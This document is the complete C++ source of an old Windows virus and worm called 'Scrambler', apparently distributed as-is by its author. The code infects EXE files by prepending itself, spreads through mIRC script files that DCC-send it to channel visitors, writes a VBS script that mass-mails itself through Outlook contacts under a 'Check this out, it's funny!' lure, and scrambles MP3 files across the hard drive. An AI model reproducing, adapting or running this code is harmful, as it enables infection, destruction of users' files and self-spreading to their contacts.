   /*
           Virus Name: Scrambler
           Version: B
           Type: Win32 EXE Prepender / I-Worm
           Author: Gigabyte
           Homepage: http://gigabyte.coderz.net
   */

   #include <iostream>
   #include <windows.h>
   #include <direct.h>
   #include <time.h>

   using namespace std;

   char hostfile[MAX_PATH], CopyHost[MAX_PATH], Virus[MAX_PATH];
   char Buffer[MAX_PATH], mp3[MAX_PATH], mp3copy[MAX_PATH], checksum[2];
   char gbmark[2], CopyName[10], ScramFile[MAX_PATH], FullPath[MAX_PATH];
   char WinScript[MAX_PATH], DirToInfect[MAX_PATH], RepairHost[MAX_PATH];
   FILE *scrambler;

   void VirCheck(char SRCFileName[])
   {
       FILE *SRC;
       char Buffer[1];
       short Counter = 0;
       int v = 0;
       SRC = fopen(SRCFileName, "rb");
       if(SRC)
       {

               for (v = 0; v < 19; v ++)
               {
                   Counter = fread(Buffer, 1, 1, SRC);
               }

               strcpy(checksum, Buffer);

               for (v = 0; v < 1; v ++)
               {
                   Counter = fread(Buffer, 1, 1, SRC);
               }

               strcat(checksum, Buffer);
           }
       fclose(SRC);
   }

   void WriteVirus(char SRCFileName[], char DSTFileName[])
   {
       FILE *SRC, *DST;
       char Buffer[1024];
       short Counter = 0;
       int v = 0;
       SRC = fopen(SRCFileName, "rb");
       if(SRC)
       {
           DST = fopen(DSTFileName, "wb");
           if(DST)
           {
               for (v = 0; v < 4928; v ++)
               {
                   Counter = fread(Buffer, 1, 8, SRC);
                   if(Counter)
                   fwrite(Buffer, 1, Counter, DST);
               }
           }
       }
       fclose(SRC);
       fclose(DST);
   }

   void AddOrig(char SRCFileName[], char DSTFileName[])
   {
       FILE *SRC, *DST;
       char Buffer[1024];
       short Counter = 0;
       SRC = fopen(SRCFileName, "rb");
       if(SRC)
       {
           DST = fopen(DSTFileName, "ab");
           if(DST)
           {
               while(! feof(SRC))
               {
                   Counter = fread(Buffer, 1, 1024, SRC);
                   if(Counter)
                   fwrite(Buffer, 1, Counter, DST);
               }
           }
       }
       fclose(SRC);
       fclose(DST);
   }

   void CopyOrig(char SRCFileName[], char DSTFileName[])
   {
       FILE *SRC, *DST;
       char Buffer[1024];
       short Counter = 0;
       int v = 0;
       SRC = fopen(SRCFileName, "rb");
       if(SRC)
       {
           DST = fopen(DSTFileName, "wb");
           if(DST)
           {
               for (v = 0; v < 4928; v ++)
               {
                   Counter = fread(Buffer, 1, 8, SRC);
                   if(Counter)
                   fwrite(Buffer, 0, 0, DST);
               }

               while(! feof(SRC))
               {
                   Counter = fread(Buffer, 1, 1024, SRC);
                   if(Counter)
                   fwrite(Buffer, 1, Counter, DST);
               }
           }
       }
       fclose(SRC);
       fclose(DST);
   }

   bool FileExists(char *FileName)
   {
       HANDLE Exists;
       Exists = CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
       if(Exists == INVALID_HANDLE_VALUE)
       return false;
       CloseHandle(Exists);
       return true;
   }

   void Scramble(char SRCFileName[], char DSTFileName[])
   {
       FILE *SRC, *DST;
       char Buffer[60000];
       Buffer == 0;
       short Counter = 0;
       int v = 0;
       SRC = fopen(SRCFileName, "rb");
       if(SRC)
       {
           DST = fopen(DSTFileName, "wb");
           if(DST)
           {
               for (v = 0; v < 40; v ++)
               {
               if(!fseek(SRC, 204800, SEEK_CUR))
               {
                   Counter = fread(Buffer, 1, 60000, SRC);
                   if(Counter)
                   {
                       if(!fseek(DST, 104448, SEEK_CUR))
                       {
                       fwrite(Buffer, 1, 60000, DST);
                       }
                   }
               }
               }
           }
       }
       fclose(SRC);
       fclose(DST);
   }

   void ScrambleMP3(char FolderSearch[])
   {
       WIN32_FIND_DATA FindData;
       HANDLE FoundFile;
       char FolderSearch2[MAX_PATH];
       strcpy(FolderSearch2, FolderSearch);
       strcat(FolderSearch2,"\\*.mp3");
       FoundFile = FindFirstFile(FolderSearch2, &FindData);
     if(FoundFile != INVALID_HANDLE_VALUE)
     {
         do
        {
           if(FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
           {
           }
     else
     {
       GetWindowsDirectory(Buffer,MAX_PATH);
       _chdir(Buffer);
       _chdir("system");

       strcpy(mp3, FolderSearch);
       strcat(mp3, "\\");
       strcat(mp3, FindData.cFileName );
       strcpy(mp3copy, "mp3.tmp");
       CopyFile(mp3, mp3copy, FALSE);

       Scramble(mp3copy,mp3);
       _unlink(mp3copy);
       }
       }
        while (FindNextFile(FoundFile, &FindData));
        FindClose(FoundFile);
     }
   }

   void HDDSearch(char Path[])
   {
       WIN32_FIND_DATA FindData;
       HANDLE FoundFile;
       char Path2[MAX_PATH], Folder[MAX_PATH];
       strcpy(Path2, Path);
       strcat(Path2, "\\*.*");
       FoundFile = FindFirstFile(Path2, &FindData);
     if(FoundFile != INVALID_HANDLE_VALUE)
     {
         do
        {
        if(FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
           strcpy(Folder, Path);
           strcat(Folder, "\\");
           strcat(Folder, FindData.cFileName);
           if(FindData.cFileName[0] !='.')
           {
                   HDDSearch(Folder);
                   ScrambleMP3(Folder);
           }
        }
        }
        while (FindNextFile(FoundFile, &FindData));
        FindClose(FoundFile);
     }
   }

   void ScriptFile()
   {
       GetWindowsDirectory(Buffer,MAX_PATH);
       fprintf(scrambler,"[script]\nn0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }\nn1=/dcc send $nick");
       fprintf(scrambler," %s%csystem%c%s\nn2=}\n", Buffer, 92, 92, CopyName);
   }

   void main(int argc, char **argv)
   {
       cout << "Scrambler" << endl;
       cout << "by Gigabyte" << endl;

       srand( (unsigned)time( NULL ) );
       for(int t = 0; t < 5; t++)
       CopyName[t] =char(97 + (rand() % 10));
       CopyName[5] = '.';
       CopyName[6] = CopyName[8] = 'e';
       CopyName[7] = 'x';
       CopyName[9] = NULL;

       strcpy(Virus, argv[0]);
       GetWindowsDirectory(Buffer,MAX_PATH);


       strcpy(FullPath, Buffer);
       strcat(FullPath, "\\system\\");
       strcat(FullPath, CopyName);
       WriteVirus(Virus, FullPath);

       WIN32_FIND_DATA FindData;
       HANDLE FoundFile;

       strcat(DirToInfect, Buffer);
       strcat(DirToInfect, "\\*.exe");
       FoundFile = FindFirstFile(DirToInfect, &FindData);

     if(FoundFile != INVALID_HANDLE_VALUE)
     {
         do
        {
           if(FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
           {
           }

     else
     {
       GetWindowsDirectory(Buffer,MAX_PATH);
       _chdir(Buffer);
       _chdir("system");

       strcpy(hostfile, Buffer);
       strcat(hostfile, "\\");
       strcat(hostfile, FindData.cFileName);

       VirCheck(hostfile);

       strcpy(gbmark,"gb");

       if(FindData.cFileName[3] != 'D')
       {
       if(FindData.cFileName[0] != 'P')
       {
       if(FindData.cFileName[0] != 'R')
       {
       if(FindData.cFileName[0] != 'E')
       {
       if(FindData.cFileName[0] != 'T')
       {
       if(FindData.cFileName[0] != 'W')
       {
       if(FindData.cFileName[0] != 'w')
       {
       if(FindData.cFileName[5] != 'R')
       {
       if(checksum[1] != gbmark[1])
       {
       strcpy(CopyHost, "host.tmp");
       CopyFile(hostfile, CopyHost, FALSE);

       strcpy(Virus, argv[0]);
       CopyFile(FullPath, hostfile, FALSE);
       AddOrig(CopyHost, hostfile);
       _unlink("host.tmp");
       }}}}}}}}}
     }
        }
        while (FindNextFile(FoundFile, &FindData));
        FindClose(FoundFile);
     }

     if(FileExists("c:\\mirc\\mirc32.exe"))
     {
     FoundFile = FindFirstFile("c:\\mirc\\download\\*.exe", &FindData);

     if(FoundFile != INVALID_HANDLE_VALUE)
     {
         do
        {
           if(FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
           {
           }

     else
     {
       _chdir(Buffer);
       _chdir("system");

       strcpy(hostfile, "c:\\mirc\\download\\");
       strcat(hostfile, FindData.cFileName );

       VirCheck(hostfile);

       strcpy(gbmark,"gb");

       if(checksum[1] != gbmark[1])
       {
       strcpy(CopyHost, "host.tmp");
       CopyFile(hostfile, CopyHost, FALSE);

       WriteVirus(Virus, hostfile);
       AddOrig(CopyHost, hostfile);
       _unlink("host.tmp");
       }
     }
        }
        while (FindNextFile(FoundFile, &FindData));
        FindClose(FoundFile);
     }
     }
       scrambler = fopen("c:\\mirc\\script.ini","wt");
       if(scrambler)
       {
           ScriptFile();
           fclose(scrambler);
       }

       scrambler = fopen("c:\\PROGRA~1\\mirc\\script.ini","wt");
       if(scrambler)
       {
           ScriptFile();
           fclose(scrambler);
       }
       scrambler = fopen("d:\\mirc\\script.ini","wt");
       if(scrambler)
       {
           ScriptFile();
           fclose(scrambler);
       }

       scrambler = fopen("d:\\PROGRA~1\\mirc\\script.ini","wt");
       if(scrambler)
       {
           ScriptFile();
           fclose(scrambler);
       }

       scrambler = fopen("e:\\mirc\\script.ini","wt");
       if(scrambler)
       {
           ScriptFile();
           fclose(scrambler);
       }

       scrambler = fopen("e:\\PROGRA~1\\mirc\\script.ini","wt");
       if(scrambler)
       {
           ScriptFile();
           fclose(scrambler);
       }

       scrambler = fopen("f:\\mirc\\script.ini","wt");
       if(scrambler)
       {
           ScriptFile();
           fclose(scrambler);
       }

       scrambler = fopen("f:\\PROGRA~1\\mirc\\script.ini","wt");
       if(scrambler)
       {
           ScriptFile();
           fclose(scrambler);
       }

       strcpy(RepairHost, Buffer);
       strcat(RepairHost, "\\system\\hostfile.exe");
       CopyOrig(Virus, RepairHost);

       strcpy(ScramFile, Buffer);
       strcat(ScramFile, "\\system\\scram.sys");
       if(FileExists(ScramFile) == false)
           HDDSearch("c:");

       strcpy(WinScript, Buffer);
       strcat(WinScript, "\\wscript.exe");

       if(FileExists(WinScript))
       {
           if(FileExists("scram.sys") == false)
           {
               scrambler = fopen("scrambler.vbs","wt");
               if(scrambler)
               {
                   fprintf(scrambler,"On Error Resume Next\n");
                   fprintf(scrambler,"Dim scrambler, Mail, Counter, A, B, C, D, E, F\n");
                   fprintf(scrambler,"Set scrambler = CreateObject(%coutlook.application%c)\n", 34, 34);
                   fprintf(scrambler,"Set Mail = scrambler.GetNameSpace(%cMAPI%c)\n", 34, 34);
                   fprintf(scrambler,"For A = 1 To Mail.AddressLists.Count\n");
                   fprintf(scrambler,"Set B = Mail.AddressLists(A)\n");
                   fprintf(scrambler,"Counter = 1\n");
                   fprintf(scrambler,"Set C = scrambler.CreateItem(0)\n");
                   fprintf(scrambler,"For D = 1 To B.AddressEntries.Count\n");
                   fprintf(scrambler,"E = B.AddressEntries(Counter)\n");
                   fprintf(scrambler,"C.Recipients.Add E\n");
                   fprintf(scrambler,"Counter = Counter + 1\n");
                   fprintf(scrambler,"If Counter > 90 Then Exit For\n");
                   fprintf(scrambler,"Next\n");
                   fprintf(scrambler,"C.Subject = %cCheck this out, it's funny!%c\n", 34, 34);
                   fprintf(scrambler,"C.Attachments.Add %c%s%csystem%c%s%c\n", 34, Buffer, 92, 92, CopyName, 34);
                   fprintf(scrambler,"C.DeleteAfterSubmit = True\n");
                   fprintf(scrambler,"C.Send\n");
                   fprintf(scrambler,"E = %c%c\n", 34, 34);
                   fprintf(scrambler,"Next\n");
                   fprintf(scrambler,"Set F = CreateObject(%cScripting.FileSystemObject%c)\n", 34, 34);
                   fprintf(scrambler,"F.DeleteFile Wscript.ScriptFullName\n");
                   fclose(scrambler);
               }
               ShellExecute(NULL, "open", "scrambler.vbs", NULL, NULL, SW_SHOWNORMAL);
           }
       }

       _chdir(Buffer);
       scrambler = fopen("winstart.bat", "wt");
       if(scrambler)
       {
           fprintf(scrambler,"@cls\n");
           fprintf(scrambler,"@echo Today..\n");
           fprintf(scrambler,"@echo I'm going to scramble your mind..\n");
       }
       fclose(scrambler);

       scrambler = fopen(ScramFile, "wt");
       if(scrambler)
       {
           fprintf(scrambler, "Scrambler\n");
           fprintf(scrambler, "by Gigabyte\n");
           fclose(scrambler);
       }

       _chdir("system");

       if(FileExists(RepairHost))
           WinExec(RepairHost, SW_SHOWNORMAL);

       _unlink("hostfile.exe");
   }
